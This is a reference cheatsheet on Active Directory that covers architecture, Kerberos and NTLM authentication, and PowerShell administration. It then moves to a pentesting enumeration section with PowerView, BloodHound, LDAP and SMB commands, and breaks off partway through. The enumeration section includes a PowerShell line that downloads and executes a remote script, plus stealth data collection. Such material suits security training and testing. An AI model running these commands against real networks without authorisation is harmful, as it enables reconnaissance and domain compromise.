---
title: Active Directory
description: Comprehensive Active Directory reference covering architecture, how AD works, administration commands, enumeration, pentesting techniques, attack paths, and defense strategies.
navigation:
  icon: i-lucide-network
tags:
  - cheatsheet
  - pentesting
---

## Overview

**Active Directory (AD)** is Microsoft's directory service for Windows domain networks. It stores information about members of the domain — including devices, users, groups, and policies — and provides authentication, authorization, and centralized management for enterprise environments.

> Active Directory is the **#1 target** in enterprise penetration testing. Over **95% of Fortune 1000 companies** use Active Directory, making it the most critical infrastructure component to understand for both administrators and security professionals.

### Why Active Directory Matters

| Perspective          | Importance                                                  |
| -------------------- | ----------------------------------------------------------- |
| System Admin         | Centralized management of users, computers, policies        |
| Security Team        | Primary authentication infrastructure to defend             |
| Penetration Tester   | Most common path to full domain compromise                  |
| Red Team             | Lateral movement, privilege escalation, persistence         |
| Blue Team            | Detection of AD-specific attacks, hardening                 |

---

## How Active Directory Works

### AD Architecture

::code-preview
---
class: "[&>div]:*:my-0"
---
Active Directory architecture overview.

#code
```
Active Directory Architecture:

┌─────────────────────────────────────────────────────────────┐
│                        AD FOREST                            │
│  ┌───────────────────────────────────────────────────────┐  │
│  │                   ROOT DOMAIN                         │  │
│  │               (corp.example.com)                      │  │
│  │  ┌─────────┐  ┌──────────┐  ┌──────────────────────┐ │  │
│  │  │ Schema  │  │  Config  │  │   Domain Naming      │ │  │
│  │  │ Master  │  │  Master  │  │   Master             │ │  │
│  │  └─────────┘  └──────────┘  └──────────────────────┘ │  │
│  │                                                       │  │
│  │  ┌─────────────────┐    ┌─────────────────┐          │  │
│  │  │   Domain        │    │   Domain        │          │  │
│  │  │   Controller 1  │◄──►│   Controller 2  │          │  │
│  │  │   (PDC Emulator)│    │   (Backup DC)   │          │  │
│  │  └────────┬────────┘    └────────┬────────┘          │  │
│  │           │                      │                    │  │
│  │    ┌──────┴──────────────────────┴──────┐            │  │
│  │    │         AD Database (NTDS.dit)     │            │  │
│  │    │  ┌────────┐ ┌──────┐ ┌──────────┐ │            │  │
│  │    │  │ Users  │ │Groups│ │Computers │ │            │  │
│  │    │  │ OUs    │ │GPOs  │ │Policies  │ │            │  │
│  │    │  └────────┘ └──────┘ └──────────┘ │            │  │
│  │    └───────────────────────────────────┘            │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
│  ┌───────────────────┐    ┌───────────────────┐            │
│  │   CHILD DOMAIN    │    │   CHILD DOMAIN    │            │
│  │  (us.corp.example │    │ (eu.corp.example  │            │
│  │       .com)       │    │       .com)       │            │
│  │   ┌────┐ ┌────┐   │    │   ┌────┐ ┌────┐   │            │
│  │   │DC1 │ │DC2 │   │    │   │DC1 │ │DC2 │   │            │
│  │   └────┘ └────┘   │    │   └────┘ └────┘   │            │
│  └───────────────────┘    └───────────────────┘            │
│                                                             │
│  ============ TRUST RELATIONSHIPS ============              │
│  Parent-Child: Automatic two-way transitive                 │
│  Tree-Root:    Automatic two-way transitive                 │
│  External:     One-way or two-way non-transitive            │
│  Forest:       One-way or two-way transitive/non-transitive │
└─────────────────────────────────────────────────────────────┘
```
::

### AD Core Components

| Component               | Description                                                    |
| ------------------------ | -------------------------------------------------------------- |
| **Forest**               | Top-level container; collection of one or more domain trees    |
| **Domain**               | Logical grouping of objects (users, computers, groups)         |
| **Domain Controller (DC)** | Server running AD DS; authenticates users, stores AD database |
| **Organizational Unit (OU)** | Container for organizing objects within a domain           |
| **NTDS.dit**             | AD database file storing all domain data                       |
| **SYSVOL**               | Shared folder containing GPOs, scripts, replicated data        |
| **Global Catalog (GC)**  | Partial copy of all objects in the forest for fast search       |
| **Schema**               | Defines all object types and attributes in AD                  |
| **Sites**                | Physical network locations for replication optimization         |
| **Trust**                | Relationship between domains allowing cross-domain access      |

### Authentication Protocols

::code-preview
---
class: "[&>div]:*:my-0"
---
How AD authentication works.

#code
```
============ KERBEROS AUTHENTICATION ============
(Default for AD - Port 88)

1. AS-REQ: Client → KDC (Domain Controller)
   "I am user jsmith, I want to authenticate"
   (Encrypted with user's password hash)

2. AS-REP: KDC → Client
   "Here's your TGT (Ticket Granting Ticket)"
   (Encrypted with krbtgt account hash)

3. TGS-REQ: Client → KDC
   "I have a TGT, I need access to FILE-SERVER"
   (Presents TGT)

4. TGS-REP: KDC → Client
   "Here's your Service Ticket for FILE-SERVER"
   (Encrypted with service account hash)

5. AP-REQ: Client → Service (FILE-SERVER)
   "Here's my Service Ticket"

6. AP-REP: Service → Client
   "Access Granted"

┌────────┐         ┌─────────┐         ┌──────────┐
│ Client │         │   KDC   │         │ Service  │
│ (User) │         │  (DC)   │         │ (Server) │
└───┬────┘         └────┬────┘         └────┬─────┘
    │  1. AS-REQ        │                   │
    │──────────────────►│                   │
    │  2. AS-REP (TGT)  │                   │
    │◄──────────────────│                   │
    │  3. TGS-REQ       │                   │
    │──────────────────►│                   │
    │  4. TGS-REP (ST)  │                   │
    │◄──────────────────│                   │
    │  5. AP-REQ                            │
    │──────────────────────────────────────►│
    │  6. AP-REP                            │
    │◄──────────────────────────────────────│

============ NTLM AUTHENTICATION ============
(Legacy - used when Kerberos isn't possible)

1. Client → Server: NEGOTIATE message
2. Server → Client: CHALLENGE (random nonce)
3. Client → Server: RESPONSE (hash of password + nonce)

┌────────┐         ┌──────────┐
│ Client │         │  Server  │
└───┬────┘         └────┬─────┘
    │  1. NEGOTIATE     │
    │──────────────────►│
    │  2. CHALLENGE      │
    │◄──────────────────│
    │  3. RESPONSE       │
    │──────────────────►│
    │  4. Access Result  │
    │◄──────────────────│
```
::

### Kerberos Ticket Types

| Ticket Type                    | Abbreviation | Encrypted With            | Purpose                              |
| ------------------------------ | ------------ | ------------------------- | ------------------------------------ |
| Ticket Granting Ticket         | TGT          | `krbtgt` account hash     | Proves user identity to KDC          |
| Service Ticket (TGS)          | ST / TGS     | Service account hash      | Grants access to specific service    |
| Golden Ticket                  | GT           | `krbtgt` account hash     | Forged TGT — full domain access      |
| Silver Ticket                  | ST           | Service account hash      | Forged service ticket — service access|
| Diamond Ticket                 | DT           | `krbtgt` + modification   | Modified legitimate TGT              |

### Key AD Ports

| Port    | Protocol | Service                              |
| ------- | -------- | ------------------------------------ |
| 53      | TCP/UDP  | DNS                                  |
| 88      | TCP/UDP  | Kerberos Authentication              |
| 135     | TCP      | RPC Endpoint Mapper                  |
| 137-139 | TCP/UDP  | NetBIOS                              |
| 389     | TCP/UDP  | LDAP                                 |
| 445     | TCP      | SMB (Server Message Block)           |
| 464     | TCP/UDP  | Kerberos Password Change             |
| 593     | TCP      | RPC over HTTP                        |
| 636     | TCP      | LDAPS (LDAP over SSL)                |
| 3268    | TCP      | Global Catalog (LDAP)                |
| 3269    | TCP      | Global Catalog (LDAPS)               |
| 3389    | TCP      | RDP (Remote Desktop)                 |
| 5985    | TCP      | WinRM (HTTP)                         |
| 5986    | TCP      | WinRM (HTTPS)                        |
| 9389    | TCP      | AD Web Services                      |

### FSMO Roles

| Role                           | Scope    | Purpose                                           |
| ------------------------------ | -------- | ------------------------------------------------- |
| Schema Master                  | Forest   | Controls schema modifications                     |
| Domain Naming Master           | Forest   | Controls domain additions/removals                |
| PDC Emulator                   | Domain   | Password changes, time sync, GPO authority        |
| RID Master                     | Domain   | Allocates RID pools for new object creation       |
| Infrastructure Master          | Domain   | Updates cross-domain group references              |

---

## AD Administration Commands

### PowerShell AD Module

::code-preview
---
class: "[&>div]:*:my-0"
---
Import and verify the AD PowerShell module.

#code
```powershell
# Import Active Directory module
Import-Module ActiveDirectory

# Verify module is loaded
Get-Module ActiveDirectory

# Install RSAT tools (if not installed)
# Windows 10/11
Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0

# Windows Server
Install-WindowsFeature RSAT-AD-PowerShell
Install-WindowsFeature RSAT-AD-Tools

# Get all available AD cmdlets
Get-Command -Module ActiveDirectory | Measure-Object
Get-Command -Module ActiveDirectory | Select-Object Name
```
::

### Domain Information

::code-preview
---
class: "[&>div]:*:my-0"
---
Gather domain information.

#code
```powershell
# Get domain information
Get-ADDomain
Get-ADDomain | Select-Object DNSRoot, NetBIOSName, DomainMode, PDCEmulator, InfrastructureMaster, RIDMaster

# Get forest information
Get-ADForest
Get-ADForest | Select-Object Name, ForestMode, RootDomain, SchemaMaster, DomainNamingMaster, Domains

# Get domain controllers
Get-ADDomainController -Filter *
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem, Site, IsGlobalCatalog, IsReadOnly

# Get FSMO role holders
Get-ADDomain | Select-Object PDCEmulator, RIDMaster, InfrastructureMaster
Get-ADForest | Select-Object SchemaMaster, DomainNamingMaster

# netdom alternative
netdom query dc
netdom query fsmo
netdom query trust

# Get domain functional level
(Get-ADDomain).DomainMode
(Get-ADForest).ForestMode

# Get domain SID
(Get-ADDomain).DomainSID

# Get all OUs
Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName

# Get domain password policy
Get-ADDefaultDomainPasswordPolicy

# Get fine-grained password policies
Get-ADFineGrainedPasswordPolicy -Filter *

# Get sites and subnets
Get-ADReplicationSite -Filter *
Get-ADReplicationSubnet -Filter *
```
::

### User Management

::code-preview
---
class: "[&>div]:*:my-0"
---
Complete AD user management commands.

#code
```powershell
# ============ QUERY USERS ============

# List all users
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Get detailed user info
Get-ADUser -Identity "jsmith" -Properties *

# Search users by name
Get-ADUser -Filter { Name -like "*john*" } -Properties DisplayName, EmailAddress, Department

# Search by department
Get-ADUser -Filter { Department -eq "IT" } -Properties Department, Title

# Find disabled accounts
Get-ADUser -Filter { Enabled -eq $false } | Select-Object Name, SamAccountName

# Find locked accounts
Search-ADAccount -LockedOut | Select-Object Name, SamAccountName, LastLogonDate

# Find accounts with password never expires
Get-ADUser -Filter { PasswordNeverExpires -eq $true } -Properties PasswordNeverExpires | Select-Object Name, SamAccountName

# Find accounts with no password required
Get-ADUser -Filter { PasswordNotRequired -eq $true } -Properties PasswordNotRequired | Select-Object Name, SamAccountName

# Find inactive accounts (90 days)
Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Select-Object Name, LastLogonDate

# Find expired accounts
Search-ADAccount -AccountExpired -UsersOnly | Select-Object Name, AccountExpirationDate

# Get user's group memberships
Get-ADPrincipalGroupMembership -Identity "jsmith" | Select-Object Name

# Get user's last logon
Get-ADUser -Identity "jsmith" -Properties LastLogonDate, LastLogon | Select-Object Name, LastLogonDate, @{Name="LastLogonConverted";Expression={[DateTime]::FromFileTime($_.LastLogon)}}

# Count all users
(Get-ADUser -Filter *).Count

# Export users to CSV
Get-ADUser -Filter * -Properties DisplayName, EmailAddress, Department, Title, Enabled, LastLogonDate | Export-Csv -Path "ad_users.csv" -NoTypeInformation

# ============ CREATE USERS ============

# Create single user
New-ADUser -Name "Jane Doe" `
    -GivenName "Jane" `
    -Surname "Doe" `
    -SamAccountName "jdoe" `
    -UserPrincipalName "jdoe@corp.example.com" `
    -Path "OU=Users,OU=IT,DC=corp,DC=example,DC=com" `
    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
    -Enabled $true `
    -ChangePasswordAtLogon $true `
    -Department "IT" `
    -Title "Systems Administrator" `
    -Office "HQ Building A" `
    -EmailAddress "jdoe@example.com" `
    -Description "IT Department - Systems Admin"

# Bulk create users from CSV
$users = Import-Csv "new_users.csv"
foreach ($user in $users) {
    New-ADUser -Name "$($user.FirstName) $($user.LastName)" `
        -GivenName $user.FirstName `
        -Surname $user.LastName `
        -SamAccountName $user.Username `
        -UserPrincipalName "$($user.Username)@corp.example.com" `
        -Path $user.OU `
        -AccountPassword (ConvertTo-SecureString $user.Password -AsPlainText -Force) `
        -Enabled $true `
        -Department $user.Department `
        -Title $user.Title
}

# ============ MODIFY USERS ============

# Update user attributes
Set-ADUser -Identity "jsmith" `
    -Title "Senior Administrator" `
    -Department "IT Security" `
    -Office "Building B" `
    -Manager "CN=John Manager,OU=Users,DC=corp,DC=example,DC=com"

# Reset password
Set-ADAccountPassword -Identity "jsmith" -Reset -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# Force password change at next logon
Set-ADUser -Identity "jsmith" -ChangePasswordAtLogon $true

# Enable / Disable account
Enable-ADAccount -Identity "jsmith"
Disable-ADAccount -Identity "jsmith"

# Unlock account
Unlock-ADAccount -Identity "jsmith"

# Set password never expires
Set-ADUser -Identity "service_account" -PasswordNeverExpires $true

# Set account expiration
Set-ADAccountExpiration -Identity "contractor1" -DateTime "2025-12-31"

# Move user to different OU
Move-ADObject -Identity "CN=Jane Doe,OU=Users,DC=corp,DC=example,DC=com" `
    -TargetPath "OU=Managers,DC=corp,DC=example,DC=com"

# Rename user
Rename-ADObject -Identity "CN=Jane Doe,OU=Users,DC=corp,DC=example,DC=com" -NewName "Jane Smith"

# ============ DELETE USERS ============

# Delete user
Remove-ADUser -Identity "jsmith" -Confirm:$false

# Bulk disable inactive users
Search-ADAccount -AccountInactive -TimeSpan 180.00:00:00 -UsersOnly | Disable-ADAccount
```
::

### Group Management

::code-preview
---
class: "[&>div]:*:my-0"
---
Complete AD group management commands.

#code
```powershell
# ============ QUERY GROUPS ============

# List all groups
Get-ADGroup -Filter * | Select-Object Name, GroupCategory, GroupScope

# Get group details
Get-ADGroup -Identity "Domain Admins" -Properties *

# Get group members
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, objectClass, SamAccountName

# Get recursive group members (nested groups)
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name, objectClass

# Get all security groups
Get-ADGroup -Filter { GroupCategory -eq "Security" }

# Get all distribution groups
Get-ADGroup -Filter { GroupCategory -eq "Distribution" }

# Count group members
(Get-ADGroupMember -Identity "Domain Users").Count

# Find empty groups
Get-ADGroup -Filter * | Where-Object {
    @(Get-ADGroupMember -Identity $_.DistinguishedName).Count -eq 0
} | Select-Object Name

# Find groups a user belongs to
Get-ADPrincipalGroupMembership -Identity "jsmith" | Select-Object Name, GroupScope

# ============ CREATE GROUPS ============

# Create security group
New-ADGroup -Name "IT-Admins" `
    -GroupScope Global `
    -GroupCategory Security `
    -Path "OU=Groups,DC=corp,DC=example,DC=com" `
    -Description "IT Administration Team"

# Create distribution group
New-ADGroup -Name "Marketing-DL" `
    -GroupScope Universal `
    -GroupCategory Distribution `
    -Path "OU=Groups,DC=corp,DC=example,DC=com" `
    -Description "Marketing Distribution List"

# ============ MODIFY GROUPS ============

# Add members to group
Add-ADGroupMember -Identity "IT-Admins" -Members "jsmith", "jdoe", "admin1"

# Remove member from group
Remove-ADGroupMember -Identity "IT-Admins" -Members "jsmith" -Confirm:$false

# Add group to another group (nesting)
Add-ADGroupMember -Identity "Domain Admins" -Members "IT-Admins"

# ============ DELETE GROUPS ============

Remove-ADGroup -Identity "OldGroup" -Confirm:$false
```
::

### Group Types and Scopes

| Group Scope    | Can Contain                                        | Can Be Used In                    |
| -------------- | -------------------------------------------------- | --------------------------------- |
| Domain Local   | Users/groups from any domain in forest             | Same domain only                  |
| Global         | Users/groups from same domain only                 | Any domain in forest              |
| Universal      | Users/groups from any domain in forest             | Any domain in forest              |

| Group Category | Purpose                                            |
| -------------- | -------------------------------------------------- |
| Security       | Assign permissions to resources                    |
| Distribution   | Email distribution lists (no security permissions) |

### Important Built-in Groups

| Group                        | SID Suffix | Purpose                                      |
| ---------------------------- | ---------- | -------------------------------------------- |
| Domain Admins                | -512       | Full domain administrative access             |
| Enterprise Admins            | -519       | Full forest administrative access             |
| Schema Admins                | -518       | Can modify AD schema                          |
| Domain Controllers           | -516       | All domain controllers                        |
| Domain Users                 | -513       | All domain user accounts                      |
| Domain Computers             | -515       | All domain computer accounts                  |
| Administrators               | -544       | Local administrators on DCs                   |
| Account Operators            | -548       | Can create/modify most accounts               |
| Server Operators             | -549       | Can manage domain servers                     |
| Backup Operators             | -551       | Can backup/restore files                      |
| Print Operators              | -550       | Can manage printers                           |
| Group Policy Creator Owners  | -520       | Can create and modify GPOs                    |
| DNS Admins                   | -1102      | Can manage DNS (potential for escalation)     |
| Protected Users              | -525       | Enhanced security for privileged accounts     |

### Computer Management

::code-preview
---
class: "[&>div]:*:my-0"
---
Manage AD computer objects.

#code
```powershell
# List all computers
Get-ADComputer -Filter * | Select-Object Name, Enabled, OperatingSystem

# Get detailed computer info
Get-ADComputer -Identity "WORKSTATION01" -Properties *

# Find servers
Get-ADComputer -Filter { OperatingSystem -like "*Server*" } -Properties OperatingSystem, OperatingSystemVersion | Select-Object Name, OperatingSystem, OperatingSystemVersion

# Find domain controllers
Get-ADComputer -Filter { PrimaryGroupID -eq 516 } | Select-Object Name

# Find inactive computers (90 days)
Search-ADAccount -ComputersOnly -AccountInactive -TimeSpan 90.00:00:00 | Select-Object Name, LastLogonDate

# Find disabled computers
Get-ADComputer -Filter { Enabled -eq $false } | Select-Object Name

# Disable computer
Disable-ADAccount -Identity "CN=OLDPC,OU=Computers,DC=corp,DC=example,DC=com"

# Remove computer
Remove-ADComputer -Identity "OLDPC" -Confirm:$false

# Move computer to new OU
Move-ADObject -Identity "CN=WORKSTATION01,CN=Computers,DC=corp,DC=example,DC=com" `
    -TargetPath "OU=Workstations,DC=corp,DC=example,DC=com"

# Get computer's group memberships
Get-ADPrincipalGroupMembership -Identity "WORKSTATION01$" | Select-Object Name
```
::

### Group Policy Management

::code-preview
---
class: "[&>div]:*:my-0"
---
Manage Group Policy Objects.

#code
```powershell
# Import Group Policy module
Import-Module GroupPolicy

# List all GPOs
Get-GPO -All | Select-Object DisplayName, GpoStatus, CreationTime, ModificationTime

# Get GPO details
Get-GPO -Name "Default Domain Policy" | Select-Object *

# Get GPO linked to an OU
Get-GPInheritance -Target "OU=Workstations,DC=corp,DC=example,DC=com"

# Create GPO
New-GPO -Name "Security-Hardening" -Comment "Workstation security settings"

# Link GPO to OU
New-GPLink -Name "Security-Hardening" -Target "OU=Workstations,DC=corp,DC=example,DC=com" -Enforced Yes

# Unlink GPO
Remove-GPLink -Name "Security-Hardening" -Target "OU=Workstations,DC=corp,DC=example,DC=com"

# Generate GPO report
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path "C:\Reports\gpo_report.html"
Get-GPOReport -All -ReportType HTML -Path "C:\Reports\all_gpo_report.html"

# Backup GPOs
Backup-GPO -All -Path "C:\GPO_Backup"
Backup-GPO -Name "Security-Hardening" -Path "C:\GPO_Backup"

# Restore GPO
Restore-GPO -Name "Security-Hardening" -Path "C:\GPO_Backup"

# Force GPO update
gpupdate /force
Invoke-GPUpdate -Computer "WORKSTATION01" -Force -RandomDelayInMinutes 0

# View applied GPOs
gpresult /r
gpresult /h C:\Reports\gp_result.html
gpresult /r /scope:computer
gpresult /r /scope:user

# Resultant Set of Policy
Get-GPResultantSetOfPolicy -ReportType HTML -Path "C:\Reports\rsop.html"
```
::

### Trust Management

::code-preview
---
class: "[&>div]:*:my-0"
---
Manage AD trust relationships.

#code
```powershell
# View all trusts
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, IntraForest

# View trust details
Get-ADTrust -Identity "partner.com" | Select-Object *

# CMD alternative
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# Verify trust
Test-ComputerSecureChannel
nltest /sc_verify:corp.example.com

# Create external trust
# netdom trust corp.example.com /domain:partner.com /add /userD:admin /passwordD:* /userO:admin /passwordO:*

# View trust direction
Get-ADTrust -Filter * | ForEach-Object {
    "$($_.Name) - Direction: $($_.Direction) - Type: $($_.TrustType)"
}
```
::

### Trust Types

| Trust Type     | Direction      | Transitivity    | Description                                |
| -------------- | -------------- | --------------- | ------------------------------------------ |
| Parent-Child   | Two-way        | Transitive      | Automatic between parent and child domains |
| Tree-Root      | Two-way        | Transitive      | Automatic between domain trees in forest   |
| External       | One/Two-way    | Non-transitive  | Between domains in different forests       |
| Forest         | One/Two-way    | Transitive      | Between two AD forests                     |
| Shortcut       | One/Two-way    | Transitive      | Optimizes auth between child domains       |
| Realm          | One/Two-way    | Trans/Non-trans | Between AD and non-Windows Kerberos realm  |

---

## AD Enumeration (Pentesting)

### Initial Domain Enumeration

::code-preview
---
class: "[&>div]:*:my-0"
---
Enumerate domain information from a compromised machine.

#code
```powershell
# ============ FROM A DOMAIN-JOINED MACHINE ============

# Current domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()

# Current user context
whoami
whoami /all
whoami /priv
whoami /groups

# Domain info via environment
echo %USERDOMAIN%
echo %LOGONSERVER%
$env:USERDOMAIN
$env:LOGONSERVER

# Net commands
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain
net view /domain
net time /domain

# nltest
nltest /dclist:corp.example.com
nltest /dsgetdc:corp.example.com
nltest /domain_trusts

# System info
systeminfo | findstr /B /C:"Domain"
```
::

### PowerView Enumeration

::code-preview
---
class: "[&>div]:*:my-0"
---
Enumeration using PowerView (PowerSploit).

#code
```powershell
# ============ LOAD POWERVIEW ============

# Download and import
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Or load from disk
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# ============ DOMAIN ENUMERATION ============

# Domain info
Get-Domain
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy).SystemAccess

# Domain controllers
Get-DomainController
Get-DomainController | Select-Object Name, IPAddress, OSVersion

# ============ USER ENUMERATION ============

# All users
Get-DomainUser | Select-Object samaccountname, description, pwdlastset, lastlogon

# Specific user
Get-DomainUser -Identity "jsmith" -Properties *

# Users with SPNs (Kerberoastable)
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Users with no Kerberos pre-authentication (AS-REP Roastable)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# Users with AdminCount=1 (privileged)
Get-DomainUser -AdminCount | Select-Object samaccountname, memberof

# Users with description containing "pass"
Get-DomainUser -Properties samaccountname, description | Where-Object { $_.description -match "pass" }

# ============ GROUP ENUMERATION ============

# All groups
Get-DomainGroup | Select-Object samaccountname

# Domain Admins members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object MemberName

# Enterprise Admins
Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse

# All privileged groups
@("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators", "Account Operators", "Backup Operators", "Server Operators", "DNS Admins") | ForEach-Object {
    Write-Host "`n=== $_ ===" -ForegroundColor Yellow
    Get-DomainGroupMember -Identity $_ -Recurse | Select-Object MemberName
}

# ============ COMPUTER ENUMERATION ============

# All computers
Get-DomainComputer | Select-Object name, operatingsystem, dnshostname

# Servers only
Get-DomainComputer -OperatingSystem "*Server*" | Select-Object name, operatingsystem

# Find computers where current user has local admin
Find-LocalAdminAccess

# ============ SHARE ENUMERATION ============

# Find all shares
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Find interesting shares
Invoke-ShareFinder -CheckShareAccess

# ============ ACL ENUMERATION ============

# Get ACLs for a user
Get-DomainObjectAcl -Identity "jsmith" -ResolveGUIDs | Where-Object { $_.SecurityIdentifier -match "S-1-5-21-" }

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Find ACLs for Domain Admins group
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# ============ GPO ENUMERATION ============

# All GPOs
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# GPOs that modify local group membership
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName

# Find GPO for specific computer
Get-DomainGPO -ComputerIdentity "WORKSTATION01" | Select-Object displayname

# ============ OU ENUMERATION ============

# All OUs
Get-DomainOU | Select-Object name, distinguishedname

# ============ TRUST ENUMERATION ============

# Domain trusts
Get-DomainTrust
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType

# Forest trusts
Get-ForestTrust

# Map all trusts
Get-DomainTrustMapping

# ============ SESSION ENUMERATION ============

# Find where Domain Admins are logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Find user sessions
Get-NetSession -ComputerName "DC01"

# Find logged on users
Get-NetLoggedon -ComputerName "DC01"
```
::

### BloodHound Enumeration

::code-preview
---
class: "[&>div]:*:my-0"
---
Collect data for BloodHound analysis.

#code
```powershell
# ============ SHARPHOUND (C# Collector) ============

# Download SharpHound
# https://github.com/BloodHoundAD/SharpHound

# Run collection - All methods
.\SharpHound.exe -c All

# Specific collection methods
.\SharpHound.exe -c DCOnly            # Domain controller info only
.\SharpHound.exe -c Session           # Session data
.\SharpHound.exe -c Group             # Group memberships
.\SharpHound.exe -c ACL               # ACL data
.\SharpHound.exe -c Trusts            # Trust relationships
.\SharpHound.exe -c Default           # Default collection

# With domain specification
.\SharpHound.exe -c All -d corp.example.com

# With alternative credentials
.\SharpHound.exe -c All -d corp.example.com --ldapusername jsmith --ldappassword Password123

# Stealth mode
.\SharpHound.exe -c All --stealth

# Exclude domain controllers
.\SharpHound.exe -c All --excludedcs

# Loop collection (for session data)
.\SharpHound.exe -c Session --loop --loopduration 02:00:00 --loopinterval 00:05:00

# ============ BLOODHOUND.PY (Python - from Linux) ============

# Install
pip install bloodhound

# Run collection
bloodhound-python -u 'jsmith' -p 'Password123' -d 'corp.example.com' -dc 'dc01.corp.example.com' -c All

# With NTLM hash
bloodhound-python -u 'jsmith' --hashes 'aad3b435b51404eeaad3b435b51404ee:hash' -d 'corp.example.com' -dc 'dc01.corp.example.com' -c All

# Specific collection
bloodhound-python -u 'jsmith' -p 'Password123' -d 'corp.example.com' -c Group,ACL,Trusts

# With DNS resolution
bloodhound-python -u 'jsmith' -p 'Password123' -d 'corp.example.com' -ns 10.0.0.1 -c All

# ============ BLOODHOUND GUI ============

# Start Neo4j database
sudo neo4j console

# Start BloodHound
./BloodHound --no-sandbox

# Upload collected data (JSON/ZIP files)
# Drag and drop ZIP files into BloodHound GUI

# Key queries in BloodHound:
# - Find All Domain Admins
# - Find Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find Computers where Domain Admins are Logged In
# - Find Kerberoastable Users with Path to DA
# - Find AS-REP Roastable Users
# - Shortest Path from Owned Principals
```
::

### LDAP Enumeration

::code-preview
---
class: "[&>div]:*:my-0"
---
LDAP enumeration techniques.

#code
```bash
# ============ FROM LINUX ============

# ldapsearch - Anonymous bind
ldapsearch -x -H ldap://dc01.corp.example.com -b "DC=corp,DC=example,DC=com"

# ldapsearch - Authenticated
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com"

# Enumerate users
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(objectClass=user)" sAMAccountName

# Enumerate groups
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(objectClass=group)" sAMAccountName member

# Domain Admins
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(&(objectClass=group)(cn=Domain Admins))" member

# Find users with SPNs (Kerberoastable)
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find users with no pre-auth (AS-REP Roastable)
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Enumerate computers
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(objectClass=computer)" name operatingSystem

# Find domain controllers
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" name

# Get password policy
ldapsearch -x -H ldap://dc01.corp.example.com -D "jsmith@corp.example.com" -w 'Password123' -b "DC=corp,DC=example,DC=com" "(objectClass=domain)" minPwdLength maxPwdAge minPwdAge pwdHistoryLength lockoutThreshold

# ============ LDAPDOMAINDUMP ============

# Install
pip install ldapdomaindump

# Run
ldapdomaindump -u 'corp.example.com\jsmith' -p 'Password123' dc01.corp.example.com

# Output creates HTML and JSON files for analysis

# ============ WINDAPSEARCH ============

# Enumerate users
./windapsearch -d corp.example.com --dc dc01.corp.example.com -u jsmith@corp.example.com -p Password123 --users

# Enumerate Domain Admins
./windapsearch -d corp.example.com --dc dc01.corp.example.com -u jsmith@corp.example.com -p Password123 --da

# Enumerate privileged users
./windapsearch -d corp.example.com --dc dc01.corp.example.com -u jsmith@corp.example.com -p Password123 --privileged-users
```
::

### SMB Enumeration

::code-preview
---
class: "[&>div]:*:my-0"
---
SMB enumeration for AD environments.

#code
```bash
# ============ CRACKMAPEXEC ============

# Enumerate hosts
crackmapexec smb 10.0.0.0/24

# With credentials
crackmapexec smb 10.0.0.0/24 -u 'jsmith' -p 'Password123' -d 'corp.example.com'

# Enumerate shares
crackmapexec smb dc01.corp.example.com -u 'jsmith' -p 'Password123' --shares

# Enumerate users
crackmapexec smb dc01.corp.example.com -u 'jsmith' -p 'Password123' --users

# Enumerate groups
crackmapexec smb dc01.corp.example.com -u 'jsmith' -p 'Password123' --groups

# Enumerate password policy
